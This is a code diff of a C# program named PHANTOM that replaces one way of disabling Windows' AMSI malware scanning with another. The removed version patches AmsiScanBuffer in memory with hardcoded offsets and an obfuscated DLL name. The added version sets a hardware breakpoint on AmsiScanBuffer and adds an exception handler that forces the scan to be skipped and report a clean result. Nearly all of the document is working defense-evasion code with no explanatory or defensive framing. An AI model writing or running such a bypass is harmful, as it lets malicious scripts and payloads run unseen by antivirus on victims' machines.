@@ -1,8 +1,7 @@
 using System;
-using System.Text;
 using System.Reflection;
 using System.Runtime.InteropServices;
-using Microsoft.VisualBasic.Devices;
+using System.Threading;
 
 namespace PHANTOM
 {
@@ -12,44 +11,118 @@ namespace PHANTOM
         private static extern IntPtr GetModuleHandle(string lpModuleName);
 
         [DllImport("kernel32.dll")]
-        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
-        private static IntPtr ASLR(IntPtr Relative_Address, IntPtr Relative_BaseAddress, string ModuleName)
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);
+
+        [DllImport("kernel32.dll")]
+        private static extern uint GetCurrentThreadId();
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
+
+        [DllImport("kernel32.dll")]
+        private static extern uint SuspendThread(IntPtr hThread);
+
+        [DllImport("kernel32.dll")]
+        private static extern uint ResumeThread(IntPtr hThread);
+
+        [DllImport("kernel32.dll")]
+        private static extern bool CloseHandle(IntPtr hObject);
+
+        [DllImport("kernel32.dll")]
+        private static extern bool GetThreadContext(IntPtr hThread, byte[] lpContext);
+
+        [DllImport("kernel32.dll")]
+        private static extern bool SetThreadContext(IntPtr hThread, byte[] lpContext);
+
+        private const int CTX_SIZE = 1232;
+        private const int OFF_FLAGS = 0x30;
+        private const int OFF_DR0 = 0x48;
+        private const int OFF_DR6 = 0x68;
+        private const int OFF_DR7 = 0x70;
+        private const int OFF_RAX = 0x78;
+        private const int OFF_RSP = 0x98;
+        private const int OFF_RIP = 0xF8;
+
+        private static IntPtr _targetAddr;
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        private delegate long VehDel(IntPtr ep);
+        private static VehDel _vehDel;
+
+        private static long Handler(IntPtr ep)
         {
-            return (IntPtr)((long)Relative_Address - (long)Relative_BaseAddress + (long)GetModuleHandle(ModuleName));
+            try
+            {
+                IntPtr er = Marshal.ReadIntPtr(ep);
+                IntPtr ctx = Marshal.ReadIntPtr(ep, IntPtr.Size);
+                uint code = (uint)Marshal.ReadInt32(er);
+                if (code != 0x80000004) return 0;
+                long rip = Marshal.ReadInt64(ctx, OFF_RIP);
+                if (rip != _targetAddr.ToInt64()) return 0;
+
+                long rsp = Marshal.ReadInt64(ctx, OFF_RSP);
+                long ret = Marshal.ReadInt64(new IntPtr(rsp));
+                long rp = Marshal.ReadInt64(new IntPtr(rsp + 0x30));
+                if (rp != 0) Marshal.WriteInt32(new IntPtr(rp), 0);
+
+                Marshal.WriteInt64(ctx, OFF_RIP, ret);
+                Marshal.WriteInt64(ctx, OFF_RSP, rsp + 8);
+                Marshal.WriteInt64(ctx, OFF_RAX, 0);
+                return -1;
+            }
+            catch
+            {
+                return 0;
+            }
         }
-
-#if x64
-        private static IntPtr amsiScanBufferAddress_Win11 = (IntPtr)0x180008260; //May change in the future!
-        private static IntPtr amsiScanBufferAddress_Win10 = (IntPtr)0x180003860; //May change in the future!
-        private static IntPtr RebaseAddress = (IntPtr)0x180000000;
-#else
-        private static IntPtr amsiScanBufferAddress_Win11 = (IntPtr)0x10005D60; //May change in the future!
-        private static IntPtr amsiScanBufferAddress_Win10 = (IntPtr)0x10005960; //May change in the future!
-        private static IntPtr RebaseAddress = (IntPtr)0x10000000;
-#endif
-
-        private static uint PAGE_EXECUTE_READWRITE = 0x40;
-
-        private static string obfDll_Str = @"*a*m*s*i*.*d*l*l*".Replace(@"*", @"");
 
         [STAThread]
         static void Main()
         {
-            IntPtr Address = IntPtr.Zero;
-            if (new ComputerInfo().OSFullName.Contains(@"11") == true)
+            string dllName = @"amsi.dll";
+            string funcName = @"AmsiScanBuffer";
+
+            IntPtr hMod = GetModuleHandle(dllName);
+            if (hMod == IntPtr.Zero)
+                hMod = LoadLibrary(dllName);
+            if (hMod == IntPtr.Zero) return;
+
+            _targetAddr = GetProcAddress(hMod, funcName);
+            if (_targetAddr == IntPtr.Zero) return;
+
+            _vehDel = new VehDel(Handler);
+            AddVectoredExceptionHandler(1, Marshal.GetFunctionPointerForDelegate(_vehDel));
+
+            byte[] ctx = new byte[CTX_SIZE];
+            BitConverter.GetBytes((uint)0x0010001B).CopyTo(ctx, OFF_FLAGS);
+
+            uint tid = GetCurrentThreadId();
+            IntPtr ht = OpenThread(0x0040 | 0x0008 | 0x0010 | 0x0002, false, tid);
+            if (ht == IntPtr.Zero) return;
+
+            if (SuspendThread(ht) == unchecked((uint)-1))
             {
-                Address = ASLR(amsiScanBufferAddress_Win11, RebaseAddress, obfDll_Str);
+                CloseHandle(ht);
+                return;
             }
-            else
-            {
-                Address = ASLR(amsiScanBufferAddress_Win10, RebaseAddress, obfDll_Str);
-            }
-            byte[] Patch = (IntPtr.Size == 8) ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 } : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
-            uint oldProtect;
-            VirtualProtect(Address, (UIntPtr)Patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
-            Marshal.Copy(Patch, 0, Address, Patch.Length);
-            VirtualProtect(Address, (UIntPtr)Patch.Length, oldProtect, out oldProtect);
+
+            GetThreadContext(ht, ctx);
+
+            Buffer.BlockCopy(BitConverter.GetBytes(_targetAddr.ToInt64()), 0, ctx, OFF_DR0, 8);
+
+            ulong dr7 = BitConverter.ToUInt64(ctx, OFF_DR7) | 1 | (1UL << 16);
+            Buffer.BlockCopy(BitConverter.GetBytes(dr7), 0, ctx, OFF_DR7, 8);
+            Buffer.BlockCopy(new byte[8], 0, ctx, OFF_DR6, 8);
+
+            SetThreadContext(ht, ctx);
+            ResumeThread(ht);
+            CloseHandle(ht);
         }
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr LoadLibrary(string lpFileName);
     }
 }
